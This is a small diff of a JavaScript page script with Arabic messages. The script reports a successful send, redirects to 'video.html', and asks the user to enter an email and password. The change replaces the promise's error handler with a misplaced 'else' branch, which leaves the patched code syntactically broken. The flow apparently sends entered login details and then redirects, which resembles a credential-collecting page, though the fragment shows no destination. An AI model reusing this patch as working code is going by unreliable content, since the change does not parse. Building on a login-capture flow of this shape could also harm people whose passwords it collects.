@@ -18,6 +18,7 @@ document.addEventListener("DOMContentLoaded", function () {
     .then(function(response) {
         console.log("تم الإرسال بنجاح!", response.status, response.text);
         window.location.href = "video.html";
-    }, function(error) {
-        console.log("فشل الإرسال:", error);
+         } else {
+            alert("⚠️ الرجاء إدخال البريد الإلكتروني وكلمة المرور!");
+        }
     });
